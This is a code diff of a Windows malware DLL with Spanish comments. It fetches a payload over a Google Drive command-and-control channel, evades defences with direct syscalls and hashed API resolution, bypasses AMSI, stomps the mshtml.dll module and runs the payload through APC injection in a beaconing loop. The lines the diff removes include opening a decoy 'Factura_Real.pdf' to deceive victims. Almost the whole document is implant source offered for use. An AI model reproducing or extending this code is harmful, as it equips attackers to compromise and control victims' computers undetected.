@@ -5,8 +5,6 @@
 #include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <time.h>
 #include <tlhelp32.h>
 #include <shellapi.h>
 #include "crypto.h"
@@ -14,25 +12,9 @@
 #include "gdrive_c2.h"
 #include "advanced_bypass.h"
 #include "syscalls.h"
+#include "god_mode_stealth.h"
 
 static PVOID g_SyscallGadget = NULL;
-
-typedef struct _API_TABLE {
-    SYSCALL_ENTRY NtAllocateVirtualMemory;
-    SYSCALL_ENTRY NtProtectVirtualMemory;
-    SYSCALL_ENTRY NtWriteVirtualMemory;
-    SYSCALL_ENTRY NtCreateThreadEx;
-    SYSCALL_ENTRY NtQueueApcThread;
-    SYSCALL_ENTRY NtResumeThread;
-    SYSCALL_ENTRY NtClose;
-    SYSCALL_ENTRY NtQuerySystemInformation;
-
-    ULONG_PTR CreateWaitableTimerW;
-    ULONG_PTR SetWaitableTimer;
-    ULONG_PTR GetSystemInfo;
-    ULONG_PTR GetModuleFileNameW;
-} API_TABLE;
-
 static API_TABLE g_ApiTable = {0};
 
 static void InitializeApiTable() {
@@ -42,65 +24,59 @@ static void InitializeApiTable() {
     g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
     g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);
     
+    g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
+    g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);
+
+    g_ApiTable.NtWriteVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtWriteVirtualMemory);
+    g_ApiTable.NtWriteVirtualMemory.ssn = GetSSN(g_ApiTable.NtWriteVirtualMemory.address);
+
     g_ApiTable.NtQueueApcThread.address = ResolveApiByHash(hNtdll, HASH_NtQueueApcThread);
     g_ApiTable.NtQueueApcThread.ssn = GetSSN(g_ApiTable.NtQueueApcThread.address);
 
     g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
     g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
-    g_ApiTable.GetSystemInfo = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetSystemInfo);
-    g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
-
-    InitGDriveApi();
 }
 
-static void OpenDecoyDocument() {
-    ShellExecuteW(NULL, L"open", L"Factura_Real.pdf", NULL, NULL, SW_SHOWNORMAL);
-}
+static void ExecutePayload() {
+    uint8_t payload[4096];
+    DWORD payloadSize = 0;
+    
+    // 1. Obtener payload del C2
+    if (!GDrive_CheckForCommands((char*)payload, sizeof(payload))) return;
+    payloadSize = 4096; // Ajustar a tamaño real recibido
 
-static void StealthSleep(DWORD dwBaseMS) {
-    srand((unsigned int)time(NULL));
-    float jitter = (float)(rand() % (C2_JITTER * 2) - C2_JITTER) / 100.0f;
-    DWORD dwSleepTime = dwBaseMS + (DWORD)(dwBaseMS * jitter);
-    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
-    if (!hTimer) return;
-    LARGE_INTEGER liDueTime;
-    liDueTime.QuadPart = -(LONGLONG)dwSleepTime * 10000LL;
-    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
-    WaitForSingleObject(hTimer, INFINITE);
-    CloseHandle(hTimer);
-}
-
-static void ThreadlessExecute(PVOID pPayload) {
-    THREADENTRY32 te; te.dwSize = sizeof(te);
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
-        if (Thread32First(hSnap, &te)) {
-            do {
-                if (te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != GetCurrentThreadId()) {
-                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
-                    if (hThread) {
-                        InvokeSyscall(g_ApiTable.NtQueueApcThread.ssn, g_SyscallGadget, hThread, pPayload, NULL, NULL, NULL);
-                        CloseHandle(hThread);
-                        break;
-                    }
-                }
-            } while (Thread32Next(hSnap, &te));
-        }
-        CloseHandle(hSnap);
+    // 2. Memoria RX vía Syscalls Directos
+    PVOID pExec = NULL;
+    SIZE_T size = payloadSize;
+    InvokeSyscall(g_ApiTable.NtAllocateVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (pExec) {
+        InvokeSyscall(g_ApiTable.NtWriteVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, pExec, payload, size, NULL);
+        ULONG old;
+        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, &size, PAGE_EXECUTE_READ, &old);
+        
+        // Ejecución Threadless
+        ThreadlessExecute(pExec);
     }
 }
 
 extern "C" __declspec(dllexport) void StartPlugin() {
-    OpenDecoyDocument();
-    g_SyscallGadget = FindSyscallGadget();
+    g_SyscallGadget = FindSyscallGadgetViaHash();
     InitializeApiTable();
-    BypassAMSI_DataOnly();
-    PVOID pMem = ModuleStomp(L"mshtml.dll", 0x1000);
-    if (pMem) ThreadlessExecute(pMem);
-    char cmdBuffer[1024];
+    
+    // Bypass AMSI (Estrategia Múltiple)
+    BypassAMSI_HWBP(); 
+    BypassAMSI_DataOnlyRobust();
+
+    // Module Stomping para persistencia en memoria benigna
+    STOMP_CONTEXT ctx = {0};
+    if (ModuleStompRobust(L"mshtml.dll", 0x2000, &ctx)) {
+        ExecutePayload();
+    }
+
+    // Mantener proceso vivo con jitter
     while (TRUE) {
-        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) { }
-        StealthSleep(60000); 
+        Sleep(60000 + (rand() % 10000));
     }
 }
 
